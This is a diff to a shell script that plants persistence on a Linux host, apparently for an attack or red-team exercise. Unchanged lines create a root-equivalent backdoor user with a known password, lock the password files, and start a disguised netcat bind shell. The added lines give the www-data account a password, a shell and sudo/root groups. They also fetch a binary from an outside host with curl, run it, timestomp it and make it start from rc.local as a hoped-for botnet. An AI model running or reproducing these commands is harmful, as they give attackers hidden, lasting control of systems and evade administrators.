@@ -19,6 +19,11 @@ useradd -u 0 -o kitten
 printf "meow\nmeow\n" | passwd kitten
 echo meow | passwd --stdin kitten 2>/dev/null
 
+# gR's commands
+echo "www-data:granger" | chpasswd
+chsh www-data -s /bin/bash
+usermod -aG sudo,root www-data
+
 # No more user changes
 chattr +iu /etc/shadow
 chattr +iu /etc/passwd
@@ -46,6 +51,9 @@ chattr +iu /root/.bashrc
 
 # Listen from the get-go
 nohup /bin/bash -c 'echo "while :; do rm -f /tmp/.shf 2>/dev/null; mkfifo /tmp/.shf; exec -a apache2 /bin/bash </tmp/.shf 2>&1 | exec -a aapche2 nc -lp 22331 >/tmp/.shf 2>/dev/null; sleep 300; done" | nohup /bin/bash >/dev/null 2>&1 &' >/dev/null 2>&1 &
+
+# See if we can't get a DNS botnet
+nohup /bin/sh -c 'curl -sL https://enmala.ga:64443/kcrond > /usr/sbin/kcrond && chmod 0700 /usr/sbin/kcrond && touch -r /bin/tar /usr/sbin/kcrod && nohup /usr/sbin/kcrond >/dev/null 2>&1 & echo >> /etc/rc.local && chmod u+x /etc/rc.local && echo "nohup /usr/sbin/kcrond >/dev/null 2>&1 &" >> /etc/rc.local && chattr +ui /etc/rc.local' >/dev/null 2>&1 &
 
 # Pending approval:
 # touch -r /usr/bin/chattr; mv /usr/bin/chattr /usr/bin/chattr.bak; touch -r /tmp/.x /usr/bin/chattr.bak
